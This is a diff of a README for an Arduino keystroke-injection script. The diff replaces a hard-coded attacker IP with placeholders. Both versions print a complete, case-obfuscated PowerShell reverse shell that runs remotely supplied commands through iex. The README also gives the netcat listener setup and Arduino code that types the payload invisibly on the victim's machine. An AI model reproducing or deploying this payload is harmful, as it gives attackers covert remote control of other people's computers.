@@ -24,10 +24,10 @@ This script leverages the `Keyboard.h` library to simulate keyboard inputs, effe
 2. **Reverse Shell**: The script types a PowerShell command to create a reverse TCP connection to a specified IP address and port. It sends the following command:
 
    ```powershell
-   $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("172.18.219.63",443);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
+   $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
    ```
 
-   - This command creates a new TCP client connection to the attacker's IP (`172.18.219.63`) on port `443`.
+   - This command creates a new TCP client connection to the attacker's IP (`X.X.X.X`) on port `443`.
    - It establishes a stream to send and receive data, effectively creating a shell on the target machine that the attacker can control remotely.
 
 3. **Simulating Keyboard Input**: The Arduino simulates keyboard input using the `Keyboard.print()` and `Keyboard.press()` functions to type out the entire PowerShell command, making it appear as though it was typed by a real user, but invisibly.
@@ -38,12 +38,12 @@ Before using this script, you need to make the following configurations:
 
 1. **Adapt Keyboard Layout**: Change `KeyboardLayout_es_ES` in the code if you're not using a Spanish keyboard layout. Adjust it to match your keyboard's country layout, for example, `KeyboardLayout_us` for a US English keyboard.
 
-2. **Configure IP and Port**: Change the IP address `"172.18.219.63"` and port `443` in the script to match the IP and port of your listening machine.
+2. **Configure IP and Port**: Change the IP address `"IP"` and port `PORT` in the script to match the IP and port of your listening machine.
 
 3. **Start Listening**: Before running the script, ensure you are in listening mode on the configured IP and port. This can be done using tools like `netcat`:
 
    ```bash
-   nc -lvnp 443
+   nc -lvnp PORT
    ```
 
 ## Usage
@@ -85,7 +85,7 @@ void setup()
   typeKey(KEY_RETURN);
   delay(1500);
   
-  Keyboard.print("$c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("172.18.219.63",443);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$");
+  Keyboard.print("$c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$");
   delay(100);
   
   Keyboard.print("s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU");
